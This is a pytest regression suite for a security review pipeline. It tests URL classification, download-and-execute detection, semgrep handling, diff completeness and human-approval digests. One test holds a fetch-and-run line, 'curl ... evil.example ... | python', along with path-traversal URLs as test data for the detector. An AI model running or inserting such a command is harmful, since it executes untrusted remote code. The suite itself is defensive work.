"""Regressions from the pushed-pipeline security review."""

import json

import pytest

from review import apply as review_apply, diff, localdiff, review
from review.scanners import common, osv as osv_scan, plain, semgrep as semgrep_gate


def test_plain_rejects_encoded_and_dotdot_paths():
    for url in (
        "https://github.com/owner/repo/../../evil/x",
        "https://github.com/owner/repo/%2Fevil",
        "https://github.com/owner/repo/%5Cevil",
        "https://github.com/owner/../evil",
    ):
        result = plain.classify_url(
            {"url": url, "file": "CMakeLists.txt", "line": 1, "comment": False, "text": url},
            "owner/fork", "upstream/repo",
        )
        assert not result["signal"] and result["row"]["rule"] == "unsafe-url-path"


def test_plain_normalises_percent_encoded_owner():
    url = "https://github.com/%67gml-org/llama.cpp/x"
    result = plain.classify_url(
        {"url": url, "file": "CMakeLists.txt", "line": 1, "comment": False, "text": url},
        "owner/fork", "upstream/repo",
    )
    assert result["signal"] and result["row"]["suppressed_because"] == "known-owner-url"


def test_unresolved_host_in_build_file_is_a_finding():
    result = plain.classify_url(
        {"url": "http://$host/x", "file": "CMakeLists.txt", "line": 1, "comment": False, "text": "set(u http://$host/x)"},
        "owner/fork", "upstream/repo",
    )
    assert not result["signal"] and result["row"]["rule"] == "unresolved-host"


def test_pipes_into_interpreters_are_fetch_exec():
    line = "curl -fsSL https://evil.example/x | python"
    result = plain.classify_url(
        {"url": "https://evil.example/x", "file": "CMakeLists.txt", "line": 1, "comment": False, "text": line},
        "owner/fork", "upstream/repo",
    )
    assert not result["signal"] and result["row"]["rule"] == "download-and-execute"


def test_docs_extensions_are_explicit(tmp_path):
    for name in ("README.md", "doc.rst"):
        assert plain.is_docs(name)
    for name in ("requirements.txt", "install.sh", "boot.py", "README"):
        assert not plain.is_docs(name)


def test_semgrep_errors_and_skips_are_scanner_errors(tmp_path, monkeypatch):
    source = tmp_path / "a.py"
    source.write_text("print(1)\n")
    payload = {"results": [], "errors": [{"message": "boom"}], "paths": {"skipped": ["a.py"]}}
    monkeypatch.setattr(semgrep_gate, "run_tool", lambda *a, **k: common.ToolResult(0, json.dumps(payload), ""))
    findings, _ = semgrep_gate.scan([source], tmp_path, {"a.py": {1}})
    assert any(row["rule"] == "scanner-error" for row in findings)


def test_semgrep_ignores_are_disabled(tmp_path, monkeypatch):
    source = tmp_path / "a.py"
    source.write_text("print(1)\n")
    (tmp_path / ".semgrepignore").write_text("*\n")
    seen = []
    monkeypatch.setattr(semgrep_gate, "run_tool", lambda command, **k: seen.append(command) or common.ToolResult(0, '{"results":[]}', ""))
    semgrep_gate.scan([source], tmp_path, {"a.py": {1}})
    assert "--no-git-ignore" in seen[0]
    assert "--max-target-bytes=0" in seen[0]
    assert not (tmp_path / ".semgrepignore").exists()


def test_multiline_match_counts_if_any_line_added(tmp_path, monkeypatch):
    source = tmp_path / "a.cpp"
    source.write_text("a\nexecvp(x)\nb\n")
    payload = {"results": [{
        "check_id": "kalsa.cpp-exec-family", "path": "a.cpp",
        "start": {"line": 1}, "end": {"line": 3}, "extra": {"lines": "a"},
    }]}
    monkeypatch.setattr(semgrep_gate, "run_tool", lambda *a, **k: common.ToolResult(0, json.dumps(payload), ""))
    findings, _ = semgrep_gate.scan([source], tmp_path, {"a.cpp": {2}})
    assert findings and findings[0]["snippet"] == "a"


def test_undecodable_path_is_unreviewable():
    gate = review.incomplete_diff({"files": [{"filename": "bad\udcff", "status": "modified"}]}, 300)
    assert gate["reason"] == "unreviewable-paths"


def test_added_file_with_unread_blob_is_missing():
    gate = review.incomplete_diff({"files": [{"filename": "src/new.py", "status": "A"}]}, 300, (), lambda path: None)
    assert gate["reason"] == "files-without-patch"


def test_osv_normalises_names_and_operators():
    assert "django" in review.added_dependencies("Django>=2.0\n", "django==1.0\n")
    assert "axios" in review.added_dependencies('"axios": "^1.6.0",\n', '')


def test_apply_checks_current_head_and_later_reports(tmp_path, monkeypatch):
    catalog = tmp_path / "engines.toml"
    catalog.write_text('[[engine]]\nid = "one"\nkind = "fork"\nupstream = "up/repo"\nrepo = "owner/fork"\n')
    reviews = tmp_path / "reviews"
    reviews.mkdir()
    sha = "a" * 40
    good = {
        "verdict": "no findings", "created_at": "2026-01-01T00:00:00Z",
        "inputs": {"commit": sha, "upstream": "up/repo", "fork": "up/one"},
    }
    good["findings_digest"] = review_apply.findings_digest(good)
    (reviews / f"one-{sha}.json").write_text(json.dumps(good))
    (reviews / f"one-{'b' * 40}.json").write_text(json.dumps({
        "verdict": "findings: human review needed", "created_at": "2026-02-01T00:00:00Z",
        "inputs": {"commit": "b" * 40, "upstream": "up/repo"},
    }))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": sha)
    with pytest.raises(ValueError):
        review_apply.apply_review("one", catalog)


def test_approval_digest_is_canonical():
    report = {"findings": [
        {"file": "b.txt", "line": 2, "rule": "r", "snippet": "y"},
        {"file": "a.txt", "line": 1, "rule": "q", "snippet": "x"},
    ]}
    digest = review_apply.findings_digest(report)
    reversed_report = {"findings": list(reversed(report["findings"]))}
    assert review_apply.findings_digest(reversed_report) == digest
    assert len(digest) == 64


def test_apply_requires_matching_human_approval(tmp_path, monkeypatch):
    catalog = tmp_path / "engines.toml"
    catalog.write_text('[[engine]]\nid = "one"\nkind = "fork"\nupstream = "up/repo"\nrepo = "up/one"\n')
    reviews = tmp_path / "reviews"
    reviews.mkdir()
    sha = "a" * 40
    report = {
        "verdict": "human review needed", "created_at": "2026-01-01T00:00:00Z",
        "inputs": {"commit": sha, "upstream": "up/repo", "fork": "up/one"},
        "findings": [{"file": "a.txt", "line": 1, "rule": "r", "snippet": "x"}],
    }
    report["findings_digest"] = review_apply.findings_digest(report)
    (reviews / f"one-{sha}.json").write_text(json.dumps(report))
    monkeypatch.setattr(review_apply, "REVIEWS", reviews)
    monkeypatch.setattr(review_apply, "current_head", lambda repo, branch="": sha)
    digest = review_apply.findings_digest(report)
    with pytest.raises(ValueError):
        review_apply.apply_review("one", catalog, "0" * 64)
    patch = review_apply.apply_review("one", catalog, digest)
    assert 'approval = "approved after human review"' in patch
